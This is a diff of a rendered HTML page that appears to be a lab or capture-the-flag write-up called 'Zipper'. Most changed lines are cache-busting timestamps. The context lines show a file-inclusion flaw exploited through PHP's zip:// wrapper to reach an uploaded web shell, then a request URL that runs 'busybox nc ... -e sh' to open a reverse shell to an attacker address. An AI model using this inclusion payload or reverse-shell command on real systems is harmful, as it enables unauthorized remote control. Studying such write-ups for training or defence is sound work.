@@ -30,28 +30,28 @@
     <meta itemprop="wordCount" content="484">
     <meta itemprop="keywords" content="Zip,7za,7z,Php-Wrapper">
     <title>Zipper :: Zenu</title>
-    <link href="/images/favicon.png?1784855724" rel="icon" type="image/png">
-    <link href="/images/favicon.ico?1784855724" rel="icon" type="image/x-icon" sizes="any">
-    <link href="/css/auto-complete/auto-complete.min.css?1784855724" rel="stylesheet">
-    <script src="/js/auto-complete/auto-complete.min.js?1784855724" defer></script>
-    <script src="/js/search-lunr.js?1784855724" defer></script>
-    <script src="/js/search.js?1784855724" defer></script>
+    <link href="/images/favicon.png?1784856625" rel="icon" type="image/png">
+    <link href="/images/favicon.ico?1784856625" rel="icon" type="image/x-icon" sizes="any">
+    <link href="/css/auto-complete/auto-complete.min.css?1784856625" rel="stylesheet">
+    <script src="/js/auto-complete/auto-complete.min.js?1784856625" defer></script>
+    <script src="/js/search-lunr.js?1784856625" defer></script>
+    <script src="/js/search.js?1784856625" defer></script>
     <script>
       window.relearn = window.relearn || {};
-      window.relearn.index_js_url="/searchindex.en.js?1784855724";
+      window.relearn.index_js_url="/searchindex.en.js?1784856625";
     </script>
-    <script src="/js/lunr/lunr.min.js?1784855724" defer></script>
-    <script src="/js/lunr/lunr.stemmer.support.min.js?1784855724" defer></script>
-    <script src="/js/lunr/lunr.multi.min.js?1784855724" defer></script>
-    <script src="/js/lunr/lunr.en.min.js?1784855724" defer></script>
+    <script src="/js/lunr/lunr.min.js?1784856625" defer></script>
+    <script src="/js/lunr/lunr.stemmer.support.min.js?1784856625" defer></script>
+    <script src="/js/lunr/lunr.multi.min.js?1784856625" defer></script>
+    <script src="/js/lunr/lunr.en.min.js?1784856625" defer></script>
     <script>
       window.relearn = window.relearn || {};
       window.relearn.contentLangs=['en'];
     </script>
-    <link href="/fonts/fontawesome/css/all.min.css?1784855724" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/all.min.css?1784855724" rel="stylesheet"></noscript>
-    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1784855724" rel="stylesheet">
-    <link href="/css/theme.css?1784855724" rel="stylesheet">
-    <link href="/css/format-html.css?1784855724" rel="stylesheet" id="R-format-style">
+    <link href="/fonts/fontawesome/css/all.min.css?1784856625" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/all.min.css?1784856625" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1784856625" rel="stylesheet">
+    <link href="/css/theme.css?1784856625" rel="stylesheet">
+    <link href="/css/format-html.css?1784856625" rel="stylesheet" id="R-format-style">
     <script>
       window.relearn = window.relearn || {};
       // configuration
@@ -177,8 +177,8 @@
 <h1 id="initial-foothold">Initial foothold<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h1>
 <h2 id="web-enumeration">Web enumeration<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
 <p>Accessing the web page reveals a simple application with a file upload function.</p>
-<p><a href="#R-image-3ae6cd628e236de938c86f082bc559a1" class="lightbox-link"><img alt="mainpage" class="lazy lightbox figure-image" loading="lazy" src="/images/zipper/zipper.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-3ae6cd628e236de938c86f082bc559a1"><img alt="mainpage" class="lazy lightbox lightbox-image" loading="lazy" src="/images/zipper/zipper.png"></a></p>
+<p><a href="#R-image-b58e7c038aa6201ec2700033bcf996ed" class="lightbox-link"><img alt="mainpage" class="lazy lightbox figure-image" loading="lazy" src="/images/zipper/zipper.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-b58e7c038aa6201ec2700033bcf996ed"><img alt="mainpage" class="lazy lightbox lightbox-image" loading="lazy" src="/images/zipper/zipper.png"></a></p>
 <p>After uploading a test file, I noticed that the application stores uploaded archives under the <code>uploads</code> directory with a generated filename such as <code>upload_1777450472.zip</code>.</p>
 <p>The application also accepts a <code>file</code> parameter and includes the requested file. Because the uploaded content remains inside a ZIP archive, I tested PHP&rsquo;s <code>zip://</code> stream wrapper to include a file from inside the archive.</p>
 <p>I created a small PHP web shell named <code>zipper</code>:</p>
@@ -187,8 +187,8 @@
 <p>Then I uploaded it.</p>
 <p>The file can be reached through the ZIP wrapper by using the uploaded ZIP path and the internal filename. The <code>#</code> separator must be URL-encoded as <code>%23</code>.</p>
 <div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>http://192.168.166.229/index.php?file=zip://uploads/upload_1777450472.zip%23zipper&amp;cmd=id</code></pre></div>
-<p><a href="#R-image-24a4e751b16c3db25f7223f81f63bfc1" class="lightbox-link"><img alt="zip" class="lazy lightbox figure-image" loading="lazy" src="/images/zipper/zip.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-24a4e751b16c3db25f7223f81f63bfc1"><img alt="zip" class="lazy lightbox lightbox-image" loading="lazy" src="/images/zipper/zip.png"></a></p>
+<p><a href="#R-image-46b4aaf6bc68dfa376e06e13fe1ceaed" class="lightbox-link"><img alt="zip" class="lazy lightbox figure-image" loading="lazy" src="/images/zipper/zip.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-46b4aaf6bc68dfa376e06e13fe1ceaed"><img alt="zip" class="lazy lightbox lightbox-image" loading="lazy" src="/images/zipper/zip.png"></a></p>
 <p>After confirming command execution, I used <code>busybox nc</code> to catch a reverse shell.</p>
 <div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>http://192.168.166.229/index.php?file=zip://uploads/upload_1777450472.zip%23zipper&amp;cmd=busybox%20nc%20192.168.45.156%204444%20-e%20sh</code></pre></div>
 <h1 id="privilege-escalation">Privilege escalation<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h1>
@@ -337,8 +337,8 @@
 <div id="R-footer" class="default-animation"><p>Built with <a href="https://github.com/McShelby/hugo-theme-relearn" title="love"><i class="fas fa-heart"></i></a> by <a href="https://gohugo.io/">Hugo</a></p></div>
       </div>
     </aside>
-    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1784855724" defer></script>
-    <script src="/js/theme.js?1784855724" defer></script>
+    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1784856625" defer></script>
+    <script src="/js/theme.js?1784856625" defer></script>
     <div id="toast-container" role="status" aria-live="polite" aria-atomic="false"></div>
   </body>
 </html>
